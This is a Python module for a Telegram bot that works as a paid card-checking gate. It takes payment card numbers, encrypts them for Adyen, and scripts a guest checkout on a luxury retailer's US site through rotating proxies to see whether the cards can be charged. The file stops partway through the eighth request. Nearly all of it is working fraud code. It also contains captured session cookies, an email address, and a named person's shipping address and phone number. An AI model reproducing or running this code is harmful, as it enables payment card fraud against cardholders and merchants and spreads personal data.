import requests as r 
import src.extras.AdyenEncrypt as AdyenEncrypt
from src.extras.check import makeGate
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
import string, random, time, rsa, base64, names, json, re
from requests.exceptions import ProxyError, ConnectionError

BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Adyen_Charged"
subtype = "$30 Charged"
command = "any"

@Client.on_message(filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False))
async def gateway(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg) 


async def get_live(card, msg):
    session = r.Session()
    email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    proxies = makeGate.load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)
    session.proxies = proxy

    max_retries = 3
    retry_delay = 3
    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_splited = makeGate.split_card(card)
    ccnum = card_splited[0]
    mes = card_splited[1]
    ano = card_splited[2]
    if len(ano) == 2:
        ano = '20'+card_splited[2]
    cvv = card_splited[3]
    AdyenECC = AdyenEncrypt.encrypter(f"{ccnum}|{mes}|{ano}|{cvv}", "99D7FDADA8B782E83139599FAD2C0627B5EA21DBED947251B1C6FD6D0380076777EBC7F91DF7D0CD6DD86896B7B60B22A82E26B92C88ABC07A4D775C2F0A1B9713E247F7093678E2F06B0A80530DF6D2B7278C2D7A2433B2D917BCC9EB1B0EE871A35AB3D8BB45D33D9AC3B3A7FC4805AFC3C28104705555123C80F0565BF8A5F8F81A7A393E31809223F9C6003A7FC31B59049BDFA8ED0FCBF86BFE562B352D1E2225CC9BD803067C6735FF5767BD683648F6B18AAD95EDD23748C0B23760BC3B01EAFC21266F799C300A8A339CBAF3EA900001C9CAF9FD404F2C493BC58AB8005E19A8EF4BD87E6B18DEFE61D0AA5568C611743C34A2EC55A97ADD216F2EA9")
    AdyenCCnum = AdyenECC[0]
    Adyenmes = AdyenECC[1]
    Adyenano = AdyenECC[2]
    Adyencvv = AdyenECC[3]

    initial_time = time.time()
    BIN = card[0:6]
    data_bin = r.get(BIN_API+BIN).json()
    brand = data_bin['brand']


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 

    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    params = {
        'colorCode': 'W0SJ',
    }

    
    response = session.get(
                'https://us.loropiana.com/en/p/man/accessories/niseko-beanie-FAN7535',
                params=params,
                headers=headers,
    ).text
            
    csrf = makeGate.getStr(response, 'LPL.config.CSRFToken = "', '"')
    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['brand']}</code> - <code>{data_bin['type']}</code> - <code>{data_bin['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['country_name']} {data_bin['country_flag']}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 

    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'csrftoken': csrf,
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/p/man/accessories/niseko-beanie-FAN7535?colorCode=W0SJ',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'productId': 'FAN7535_W0SJ_NR',
        'amount': '1',
        'orderEntryNumber': '',
        'gtmPushOriginCategoryOnAdd': 'true',
    }

    

    response = session.post('https://us.loropiana.com/en/api/cart/update', headers=headers, data=data)


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://us.loropiana.com/en/cart',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    

    response = session.get('https://us.loropiana.com/en/checkout/single-step-checkout', headers=headers).text
    
    csrf = makeGate.getStr(response, 'LPL.config.CSRFToken = "', '"')


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/checkout/single-step-checkout',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'email': 'darwindevoficial@gmail.com',
        'CSRFToken': csrf,
        'cst': '',
    }

    

    response = session.post('https://us.loropiana.com/en/login/checkout/guest', headers=headers, data=data)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'csrftoken': csrf,
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/checkout/single-step-checkout',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    params = {
        'version': '1',
        'formType': 'SHIPPING',
    }

    json_data = {
        'billingAddress': False,
        'shippingAddress': True,
        'companyName': None,
        'country': {
            'isocode': 'US',
            'name': 'United States',
        },
        'countryIso': 'US',
        'firstName': 'Darwin',
        'id': None,
        'lastName': 'Moreno',
        'line1': 'Address 2: Unit 4',
        'line2': None,
        'phone2': None,
        'phone': '+1 3055993939',
        'postalCode': '33166',
        'region': 'US-FL',
        'regionIso': 'US-FL',
        'alternativeRegion': '',
        'titleCode': 'mr',
        'town': 'Doral',
        'area': None,
        'notValid': None,
        'remarks': None,
        'residentOf': None,
        'koreanAddressButton': None,
    }

            

    response = session.post(
                'https://us.loropiana.com/en/api/my-account/add-address',
                params=params,
                headers=headers,
                json=json_data,
    ).json()
    shipping_id = response['addresses'][0]['id']



    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Sixth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'AKA_A2=A; bm_sz=22A8F7207CCF15CDF883F5FE3241E41C~YAAQCHs1F3Q+pmKNAQAAbF4vehZvXWcKLli1rC+HyUTTJU8Crl46+ueyXmzrEK1dqanuCozUnW+uaGS3c3MSTV+Y/4qEVektA8XjmwGHaDc1DaiC4uMpihiKIQ4or6+XvVuCmgQ3DLk6oKVsUL/+7EhhRci8qIHm9341bbUofSOSgL7RqSEfBLWH62ZIx/++/CxZpDdWK6g8Wtgh3fkWl9tbEt7z9WyoHusEx0G9iG3fhC4NhTuUwmHOQye7OqMO7PnRkPzKxZx2cClZimAth56+k9E44+zF12+jz7uy06qTFFYKvLWnj3+l4j/0zzk0ligNzXmH96kr/J191yQvde+fZPujWWtwLUYRjs8TlnVhRf7sgjSC/ndw~4403779~4602167; bm_mi=5F95AE8C2C40B94CF37E6A5CA9FFB6B8~YAAQCHs1F3s+pmKNAQAAn14vehaKls0a7tn8mZ79XCxNr4iBsOCO0Zvmu14wNW09JmbK9AAuBZA1+lO9J9V4dk+dcejRH7IBE4wZLUkij9YpDSj8aTCoaZ3RSRwzvWpCqCjatLnbpUB+4/voqmSwo0eNhg2jYYjwa21yNHQlCfKs3xicho+jTZJaAzEPseR7rROM0Rq8f38lXMTvT7Pix7Do0M/TEmrplOy14yuFSAaPcUOpoVoaQg6vWX2IdXK9llhZYogfRuq5Yy+ZMiwfSyJQyju491yCnx6SDh9bTNkC5+Fp7Hmp+qjSbFuYwb5TL86hIw==~1; _abck=9503C058AC6F925328C0D826E6C3BD61~0~YAAQCHs1FxVBpmKNAQAAT2wveguJsBaDVBbtgBAYZ7fDRKBoIUwkSCUKBiGT1I7dqiaFZIR7zo684DpgiaatJvpV0GSsJpjfLivpUDzO8gJ2Ekv7RjdBSuIdZJmh4FxdatxR/nsq62UXTFzPNnhAoQpWlyce6Mp6wEOrx3bDSLXAQzxF80el7FzlZ8hy5RQPWC89ULRrXRu2NPf6mpSfYwqPGGOtMSIC7KGYFUyHFGEkNIFvFrSssmF7yNFpnBUD1uJ/ob8W27TZ2mRG0FnjGVuoyAHvpwsSMLyp2sLk9Tm4XK/gxvnD783skyEkMnR37sPyq5Xb7QRx9WgDfmhnk/zghIt7v4FZcK9ZsrI0u98ZDT/nlhPRtLa5aHfXE7xpT320DmYGWyMSVLHwQl+aA69BpJHg/pG5Wut4Ig==~-1~-1~-1; preferredSite="https://us.loropiana.com"; anonymous-consents=%5B%5D; cookie-notification=NOT_ACCEPTED; B2C_JSESSIONID=Y2-c47c63d0-7e78-454a-86b1-9d3f808b6081; loropianaSite=loropianaus; ak_bmsc=17B30602F262F8285A5E5F1E900C2996~000000000000000000000000000000~YAAQCHs1F1dCpmKNAQAA6XMvehYDNTjHhD1JU+DtD9yjuZDJiKD0rqL/QWc+BhLvo/nwm+OqupbFmgHkDPFRf4TCbaHN4YQHzWjKc5N4ZaBrrwThmiMPsh5ntNXK+gQ3RN3G1JcLO6e5LLSzzcH5Z8WPels7+JLDxAGWkmb/ynPwLvCd4qwot9t7lIaS7WECjSw4pzyl8xbffbDlMbH9sjB7PSD01x3Ycit/9Qh/0pSLx54zlrD3lHnVbHB0zxWCqUGqETMM7oxsnxsE93oTn8S8wQ0HbxdY3uqjMzqGsAuUMGH4ALYXWd2GVRVxdeJ48NXb3LWPRMFgwUTdowiNmvPA4LQh9jIW86vHGa2gGpPx1bXWHS9lC3KYYxfNe5mP0ZN9gLt8vyZVCWhZHIml9WbvlFFQWgRh/PXAXQ1bFUsdcDM2yb5w+9/L0Kc9ENpdZwkfI/Y0wBYbKemykmNGPOpFvnVU9DMLij1UIZtcXXXjSJlmX5UTrCqWeVRKwNWSY59VbxGI4IkIzqomlqw7vLCLOzr2NjaDpYI=; _ALGOLIA=anonymous-c9c1ee56-66a6-417d-ac3a-50df3998f637; _pk_id.www-loropiana-com.6421=08ff36dc51abb503.1707151947.; _pk_ses.www-loropiana-com.6421=1; _gcl_au=1.1.1677157124.1707151951; _cs_mk_ga=0.06377189096173241_1707151951342; cookieConsentOneTrust=1&2&3&4; _gid=GA1.2.1498419964.1707151954; _cs_c=0; FPID=FPID2.2.EzkaHVmHwu23uWiPZdDkH23hqenrlxbjrv7M25xO2Ts%3D.1707151948; FPLC=qv2owIQ%2B8MRKztO4cmR9d5l8BzKj%2BO%2BMSbn6fBSZ%2FNgyx9gzeGgnz2aczwKng2hLiAsMm43f881QhBzMrt4orb4QxzoN1bzHJLxUVdQcIQtBxo%2Fz%2FiYK%2BIuGpMCXhQ%3D%3D; _pin_unauth=dWlkPU9UVmxZek5sWkdZdE1tWmpNaTAwTVRJeExXSXpaV0l0TlRZeU0ySXlZVFUzTWpVNQ; _fbp=fb.1.1707151957120.1862613803; OptanonAlertBoxClosed=2024-02-05T16:53:27.349Z; _dyid=-6606779698162625976; _dyjsession=31875bdc4d09d4b8ca47ac164f2b54a9; _dy_csc_ses=t; dy_fs_page=us.loropiana.com%2Fen; _dy_df_geo=Germany..; _dy_geo=DE.EU.DE_.DE__; _dycnst=dg; _dycst=dk.w.c.ss.fst.; _dyid_server=-6606779698162625976; _dy_c_exps=; _dy_c_att_exps=; _dy_cs_gcg=Dynamic%20Yield%20Experiences; _dy_cs_cookie_items=_dy_cs_gcg; categoryLastVisited=L2_MEN_ACCESSORIES; anonymous-wishlist=e56da1b7-db28-472b-9123-292ed087d1b9; FAI8452_8000=category%20page; pdpLastVisited=FAI8452_8000%2CFAM5891_MB97; loropianaEU-cart=e848d59e-fccc-45be-94d2-e2698a5cf33b; loropianaJP-cart=7d88df3a-d256-49c8-a517-8b680ae12b90; loropianaUS-cart=616f4e15-1b73-41e8-a228-cf29e592db4a; loropianaKR-cart=f2ebf046-855e-4d3a-8a1c-482c6e81ee11; loropianaCA-cart=f150cbc7-3ea3-443c-9562-9a8aae485d8c; loropianaUK-cart=cf7f539f-933b-40ba-8ac7-1683480a3b7b; loropianaHK-cart=320eb1e5-75ea-45f3-91de-b817695d7a8d; _dy_soct=1159806.1451389.1707152031*1215367.1691635.1707152294; FAM5891_MB97=product_detail_page; FAM5891_MB97_L=product_detail_page; loropianaUAE-cart=f1063676-4024-4533-aebb-4bfd019e1096; _dy_ses_load_seq=14767%3A1707152407571; _uetsid=f5caf410c44611ee80536135e1effcdd; _uetvid=f5cb2f00c44611eea5104f946fb33909; _ga_JX1QGE1J9P=GS1.1.1707151953.1.1.1707152411.0.0.0; forterToken=cb3bc781e062453589e13526d3369929_1707152407981__UDF43-m4_15ck_; _dy_lu_ses=31875bdc4d09d4b8ca47ac164f2b54a9%3A1707152415466; _dy_toffset=-6; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Feb+05+2024+17%3A00%3A17+GMT%2B0000+(Coordinated+Universal+Time)&version=202312.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=eb03a594-d6cb-4eab-bc81-67964d88ee7b&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0005%3A1%2CC0004%3A1%2CBG1742%3A1%2CC0002%3A1%2CSSPD_BG%3A1&geolocation=DE%3B&AwaitingReconsent=false; inside-eu4=439993505-d6b88da906d3c1e8e02ef27174ccad882c33377436d549fd95110bb64c94c317-0-0; _ga=GA1.2.1012676151.1707151948; RT="z=1&dm=us.loropiana.com&si=b5316791-d8f3-4d34-aecb-7d12a9c2b276&ss=ls966rti&sl=12&tt=5m46&bcn=%2F%2F17de4c14.akstat.io%2F&ld=aa0l"; cto_bundle=PwJU_l95VVJncmQ4OVcxRTdYbzdJOFRBWVFOQ2RJQ1pSNW5GV0ttOThCc001Rzd2c1d0ckNldnhWRHp4WkFmcFNERkpwc0F3bEdSRG1yJTJGODFYczA4b0paWFRHNXJDc3JJeGdNOVVCbE14U0lsVWlobW5zRFFlVyUyQjJpdHM5QlZIUk5GQTVHSGolMkYlMkZDams4eUpDd1R1bnJsNlBoQSUzRCUzRA; acceleratorSecureGUID=a4cf52f70f981f9f98884284cfb0dcafb40ae5c3; _dc_gtm_UA-20296299-10=1; _cs_id=81b7d7ae-5b6d-a25b-c59f-e2c1b2615b8e.1707151954.1.1707152526.1707151954.1.1741315954716.1; _cs_s=17.5.0.1707154326584; _ga_8NP3BVTBV0=GS1.1.1707151948.1.1.1707152545.0.0.0; bm_sv=C00F1E620F0EEADACE8612CB6CBB9530~YAAQCHs1F7P4p2KNAQAAwaM4ehZIzzIcPvTMF07P/Sh8PckaqBcCfN3SHrY67PdOPqiOqQd3SjYflIZLhsog3wSBTnZUiOlQIrEYS7vczrLcsRqz6lxjtUaWA4cvl4bDlCRFmYVK31W9bY7ZD/pVhbYovQWV2cvZH5QlEvupEp4oge83bkqClJokUJjdNE+itNABorPbD3Ecw/stVTtgI8rNUZld5eFNlLOUPpjUNLQRZPSN2wONLE33x2JDiovcfzh05Ik=~1',
        'csrftoken': csrf,
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/checkout/single-step-checkout',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'addressCode': shipping_id,
        'version': '1',
    }

            

    response = session.post(
                'https://us.loropiana.com/en/api/checkout/select-delivery-address',
                headers=headers,
                data=data,
    ).text
    cart = makeGate.getStr(response, '"cart":{"code":"', '"')


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Seventh request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'preferredSite="https://us.loropiana.com"; anonymous-consents=%5B%5D; cookie-notification=NOT_ACCEPTED; B2C_JSESSIONID=Y1-22f9265c-5a14-4c33-be7c-02bc01ec1bee; bm_sz=0EAE587D88599F218704C33109E672C1~YAAQCHs1F99PumKNAQAA6CJ9ehboctPSfpp0Ej5oy8WPua+xAlU2k7idt4b2g++hiE8So1EVr4CHVKWYteJuC6XjNSxGuYwQjYImW0jyJ5yzOGuUD3pu/Me1RjRDfeGZ3aOi6WafGcbDY0HLsXVaLisBVA6OCrEHQuidBk0Ltq0SjVd1xOgHXgHlmYE2rI/xhhJWdb+KPGL2uPZiUCbSTYeqMfLGTu2ZWc9rnbLX0MlFSMjq275s1oVPkelsDnJoSo6V/7mbg9VkaHiFgzQkBnZqqSjPi7UOK6FUzmao4LEhlVSxoZ2CNli/+Swm1Vb9/0/aQw+4Ns4wimpgzQF4NWHTlTyZpLJtfEbVoiRW5Qtuyp9PAQvWnv6W~4273974~3616820; _abck=C2A7914B0D71841D80780799C75C9689~0~YAAQCHs1F0lSumKNAQAAzDB9egsqi1rleCm0Jrb6w/fl17ccgz1Vt1zjKxOjCgvtY/GTuuIvD19Z5a/kAh8sVwlVoBfGn69k6LvKg18OmaR4mMFPKCuHM3j7HREUbamqpwp1ANT+mq4euyd8qWq1NxyzPyV+LFVtBUUvKOB+POgGGowpghS2eTC7q4DieTUAfXwfK50TysVpfscg4odKGKHRDlbaKkx0GOZwYWRdDa6wELgkmBUS8g3Ta6SyNCpm0lCHNVq10qeYCKDcy3xfW2rZuvHIEqWz0G2kTnhl3XpBpjNnz4W6xQTZT5WXcP+Qdfd5tCH/of7FNo6iYCSw4oLSQyLRnQmK4HKJYJE4kdumNyqG8+DP/XcLaBx8xf+93liDBbJiWeVipV5dhRIkFtC0eFdH5kkJasgj1g==~-1~-1~-1; loropianaSite=loropianaus; ak_bmsc=EF14D1132129FDF49E22C6DA6230B53E~000000000000000000000000000000~YAAQCHs1F9FSumKNAQAA/zN9ehaRilf+ZX0TxOUN6j1YYvjLr8A6ojUX22N0uJ+V+NZuUL+WZ8mEVZyaC9/yuinJurVtMDMrGKUPiB77naqL8WnFE3VjuwgJY33xkU630SnxoJFvCRDFpMB3umqcHm2gWpzh8hi9giqd0+kn6QJBTkkJoZ0QesSb2AIFYUcHrLSvtvXEH69T0xghGaGh1KDMnkc/ioIob1je87KeATMVcViyMCCu2MZ4LqRL+UWccfrpQxIbGx777EY9T5NZF6cYMCF54IUbXQ2FOKcj6+CZEqF+WfpeoMkOd/fbJnMkwcAuywdSUhw5HV1815NFSyU0K+VLv76+gfk2aEuq5b0FKCXARayjjLUkh6uFLa17+VKQv3uMuTsOVkn9Z2q2PqMqte+XITgQb1ulaKca41dRz3BLs0YYzQVLdfNsdPhzE+6z3lAqkITJmkgZYGo9a4jXF2voSGY4/ImkILBKVQk1Xkdig6uccjEsbmoDlsp9x2gdgvY=; _pk_id.www-loropiana-com.6421=b744ab60dff4aff0.1707157043.; _pk_ses.www-loropiana-com.6421=1; _ALGOLIA=anonymous-f7bd87ee-03da-4c54-b90c-633e8d73a53c; anonymous-wishlist=584b38ea-4ee3-4707-92e0-f3c9741e50fa; _gcl_au=1.1.1529124227.1707157043; _cs_mk_ga=0.4465633627207315_1707157043307; cookieConsentOneTrust=1&2&3&4; _gid=GA1.2.892031052.1707157044; _cs_c=0; FPID=FPID2.2.BgC13mxdMwfL%2BO%2FJ6MuDfTkoiOqZktqsphez1bcb9fk%3D.1707157043; FPLC=bUXZ2l2DDasMxBmFeCnSdeR4B9ZyjiHWl3ulH%2FN1zNRIw%2FrA7FulzuTJ5jiqUsJqwiWpkgXiT1bDGn%2FI3y5MEDtmdlcecyzEYGm2wRk%2Bt3kFbq11Ek7dm0QSRqm%2F3Q%3D%3D; _fbp=fb.1.1707157044418.1204330332; _pin_unauth=dWlkPU9EazFaR05oT1RjdFpUVTVNUzAwWlRGbUxUbGtZV0l0T1RNM056UTVPREZrWmpNMw; FAM5891_MB97=product_detail_page; pdpLastVisited=FAM5891_MB97; OptanonAlertBoxClosed=2024-02-05T18:17:30.293Z; _dyid=-3008403595893594576; _dyjsession=7c5813d1830ded3a810a94216cd2b05e; _dy_csc_ses=t; dy_fs_page=us.loropiana.com%2Fen%2Fp%2Fman%2Faccessories%2Fsocks%2Feveryday-socks-fam5891%3Fcolorcode%3Dmb97; _dy_df_geo=Germany..; _dy_geo=DE.EU.DE_.DE__; _dycnst=dg; _dyid_server=-3008403595893594576; AKA_A2=A; _dy_c_exps=; _dy_c_att_exps=; _dy_soct=1159806.1451389.1707157074*1215367.1691635.1707157074; _dy_cs_gcg=Dynamic%20Yield%20Experiences; _dy_cs_cookie_items=_dy_cs_gcg; _dycst=dk.w.c.ss.fst.; loropianaEU-cart=d2da88fd-0af5-4681-bfbe-c28daac7de41; loropianaJP-cart=53f28e3e-c7ff-4f61-b448-9334c86f8e6d; loropianaUS-cart=8f66867f-4080-4081-a81f-7283d1a781e8; loropianaUAE-cart=362c8258-5357-4c09-9feb-2fe6c6480de6; loropianaKR-cart=0d6dd0a4-39e0-4cd6-b084-488024ef8299; loropianaCA-cart=6450bf71-2715-4f66-b82a-4f36da2544e1; loropianaUK-cart=203719a9-320d-416e-b974-2765c9759ea3; loropianaHK-cart=55b14df6-32c9-47d5-aebb-f806ee0e046e; FAM5891_MB97_L=product_detail_page; _dy_ses_load_seq=50986%3A1707157666045; _dy_lu_ses=7c5813d1830ded3a810a94216cd2b05e%3A1707157669255; _dy_toffset=-3; _ga_JX1QGE1J9P=GS1.1.1707157043.1.1.1707157669.0.0.0; _uetsid=cf6c7e00c45211ee97a597f4f6dc694e; _uetvid=cf6cd780c45211eea058e1bdc70aa5cd; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Feb+05+2024+18%3A27%3A50+GMT%2B0000+(Coordinated+Universal+Time)&version=202312.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=474534fd-bf97-43c7-ab5a-c2d176176803&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0005%3A1%2CC0004%3A1%2CBG1742%3A1%2CC0002%3A1%2CSSPD_BG%3A1&geolocation=DE%3B&AwaitingReconsent=false; _ga=GA1.2.294023112.1707157043; forterToken=75968873f5134d10960ce61eff6110da_1707157666424__UDF43-m4_15ck_; inside-eu4=440036934-f5d8e530fcca1b89cf3b5bba2ebd43808e2a613c05b2fc1159bfbae4f5fda932-0-0; cto_bundle=OMhLDV8wNU53VSUyQktJZ3NpYVludHBQVk1zeWpkTFNwWTdYUXhuMmI5R1FGdjJrWUtuV1RXUjR3SiUyRjJoeVhVZFdBVEpadUw0MlolMkJ0RyUyRlVTM2clMkY0dDZBY0V2UTFOeFZyJTJCaTNPbUJnNGlaSnFlZmdYS1ZTb3NxJTJGUFZCQ2VYVWZUOEpkRkZrTlFhTFFqalNobVQ1M29sUHhQYWZyZyUzRCUzRA; RT="z=1&dm=us.loropiana.com&si=c41e0366-e2a3-4a2c-b9a0-7ce8f91dc38e&ss=ls997z4y&sl=f&tt=1gdr&bcn=%2F%2F17de4c19.akstat.io%2F&ld=doa2"; acceleratorSecureGUID=9957032e09f2e56189d75814c17f7ea7100a96fe; _cs_id=8664b02f-5b6d-a350-914c-a99a5932d021.1707157044.1.1707157728.1707157044.1.1741321044273.1; _cs_s=9.0.0.1707159528045; _ga_8NP3BVTBV0=GS1.1.1707157042.1.1.1707157737.0.0.0; bm_sv=9C55C74CC78A4BB1C4D757DC7C1E3265~YAAQCHs1F07EvGKNAQAA/+mHehb/kmLeyaj/qven2trfeCutW7GwUhe7Q6glCCJP7wPIxoVsrcWDZJZfPnNRiXsLAbCSdFzgwZS00qJKI2k06TJolWDGXb66b7er7Hi7C7NmwFCUzThoCkBGzuvqkErogBBVIz43ERkdq3AiM8WvTiHR7MyDfu4jjKZDCvGYpK/Sj6Vzsqh+ny8eXTNR5tJGGCLtZlOv+zCRxGEKwrraG9c34YLpq7Jn4bVO6rqVE5+Iuw==~1',
        'csrftoken': csrf,
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/checkout/single-step-checkout',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'deliveryMethodCode': 'FEDEX_SLOW',
        'shippingType': 'SHIP_FROM_STORE',
        'warehouseCode': 'USW1-ESH1',
        'splitEntryCode': f'{cart}_1',
        'isOneShipment': 'false',
    }

               
    response = session.post(
                'https://us.loropiana.com/en/api/checkout/select-delivery-method',
                headers=headers,
                data=data,
    )

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Eith request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'us.loropiana.com',
